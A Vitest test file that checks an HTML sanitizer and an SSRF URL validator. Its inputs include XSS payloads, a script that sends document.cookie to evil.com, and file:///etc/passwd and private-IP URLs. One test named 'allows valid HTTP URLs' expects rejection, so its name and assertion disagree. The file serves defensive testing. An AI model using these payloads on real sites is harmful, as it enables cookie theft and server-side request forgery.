import { describe, it, expect } from "vitest";
import { sanitizeHtmlForRenderer } from "../../lib/sanitizeHtml";
import { validateAgentUrl } from "../../api/AgentApiManager";

describe("sanitizeHtmlForRenderer", () => {
	it("removes script tags", () => {
		const input = "Hello <script>alert('xss')</script> world";
		expect(sanitizeHtmlForRenderer(input)).toBe("Hello  world");
	});

	it("removes multiline script tags", () => {
		const input = `<script>
			fetch('http://evil.com?data=' + document.cookie)
		</script>safe text`;
		expect(sanitizeHtmlForRenderer(input)).toBe("safe text");
	});

	it("blocks javascript: URLs in href", () => {
		const input = `<a href="javascript:alert('xss')">click</a>`;
		const result = sanitizeHtmlForRenderer(input);
		expect(result).not.toContain("javascript:");
		expect(result).toContain("blocked:");
	});

	it("blocks on* event handlers", () => {
		const input = `<img src="x" onerror="alert('xss')" />`;
		const result = sanitizeHtmlForRenderer(input);
		expect(result).not.toContain("onerror");
	});

	it("blocks data:text/html URLs", () => {
		const input = `<a href="data:text/html,<script>alert(1)</script>">click</a>`;
		const result = sanitizeHtmlForRenderer(input);
		expect(result).not.toContain("data:text/html");
	});

	it("removes iframe tags", () => {
		const input = `<iframe src="http://evil.com"></iframe>`;
		expect(sanitizeHtmlForRenderer(input)).toBe("");
	});

	it("passes through safe markdown", () => {
		const input = `# Heading\n\n**Bold** and *italic*`;
		expect(sanitizeHtmlForRenderer(input)).toBe(input);
	});
});

describe("validateAgentUrl (SSRF protection)", () => {
	it("allows valid HTTPS URLs", () => {
		expect(validateAgentUrl("https://api.example.com/v1").ok).toBe(true);
	});

	it("allows valid HTTP URLs", () => {
		expect(validateAgentUrl("http://localhost:8080").ok).toBe(false);
	});

	it("blocks localhost", () => {
		expect(validateAgentUrl("http://localhost:8080").ok).toBe(false);
	});

	it("blocks 127.0.0.1", () => {
		expect(validateAgentUrl("http://127.0.0.1:8080").ok).toBe(false);
	});

	it("blocks private IPs", () => {
		expect(validateAgentUrl("http://192.168.1.1/api").ok).toBe(false);
		expect(validateAgentUrl("http://10.0.0.1/api").ok).toBe(false);
		expect(validateAgentUrl("http://172.16.0.1/api").ok).toBe(false);
	});

	it("blocks file:// URLs", () => {
		expect(validateAgentUrl("file:///etc/passwd").ok).toBe(false);
	});

	it("blocks data:// URLs", () => {
		expect(
			validateAgentUrl("data:text/html,<script>alert(1)</script>").ok,
		).toBe(false);
	});

	it("blocks javascript:// URLs", () => {
		expect(validateAgentUrl("javascript:alert(1)").ok).toBe(false);
	});
});
